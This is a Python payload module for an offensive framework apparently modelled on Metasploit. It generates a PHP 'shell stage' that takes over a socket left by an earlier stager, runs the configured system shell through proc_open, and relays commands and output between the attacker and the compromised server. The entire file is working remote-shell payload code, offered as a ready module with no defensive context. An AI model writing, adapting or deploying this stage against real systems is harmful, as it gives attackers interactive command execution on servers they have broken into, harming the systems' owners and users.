import struct
from collections.abc import Sequence

from teralibs.tsf.base.payload import ARCH_PHP, PLATFORM_PHP, STAGE, Payload


class TerasploitModule(Payload):
    """PHP interactive shell stage."""

    NAME: str = "PHP Shell Stage"
    DESCRIPTION: str = "Spawn a PHP piped command shell"
    AUTHOR: Sequence = ["4steroth"]
    LICENSE: str = "BSD-3-CLAUSE"
    VERSION: str = "1.0"
    RANK: str = "normal"
    REFERENCES: Sequence = []
    PAYLOAD_TYPE: str = STAGE
    ARCH: Sequence = [ARCH_PHP]
    PLATFORM: Sequence = [PLATFORM_PHP]

    def generate_stage(self, ctx) -> bytes:
        """Return the PHP shell stage bytes."""
        stage = [
            "$s = $GLOBALS['msgsock'];",
            "$s_type = $GLOBALS['msgsock_type'];",
            "$descriptorspec = [",
            "    0 => ['pipe', 'r'],",
            "    1 => ['pipe', 'w'],",
            "    2 => ['pipe', 'w']",
            "];",
            f"$process = proc_open('{ctx.get_option('SHELL')}', $descriptorspec, $pipes);",
            "if (is_resource($process)) {",
            "    stream_set_blocking($pipes[0], 0);",
            "    stream_set_blocking($pipes[1], 0);",
            "    stream_set_blocking($pipes[2], 0);",
            "    while (true) {",
            "        $status = proc_get_status($process);",
            "        if (!$status['running']) break;",
            "        $read_arr = [$s];",
            "        $write_arr = null;",
            "        $except_arr = null;",
            "        if (stream_select($read_arr, $write_arr, $except_arr, 0, 50000) > 0) {",
            "            $input = ($s_type === 'socket') ? @socket_read($s, 1024) : @fread($s, 1024);",
            "            if ($input === false || $input === '') break;",
            "            fwrite($pipes[0], $input);",
            "        }",
            "        foreach ([$pipes[1], $pipes[2]] as $pipe) {",
            "            $output = fread($pipe, 1024);",
            "            if ($output !== false && $output !== '') {",
            "                ($s_type === 'socket') ? @socket_write($s, $output, strlen($output)) : @fwrite($s, $output);",
            "            }",
            "        }",
            "    }",
            "    fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);",
            "    proc_close($process);",
            "}",
        ]

        # We join the stage here.
        stage = "\n".join(stage)

        # Encode the string into utf-8 and get the length prefix using struct.
        payload_bytes = stage.encode("utf-8")
        lenght_prefix = struct.pack(">I", len(payload_bytes))

        # Return the whole payload bytes with length prefix.
        return lenght_prefix + payload_bytes
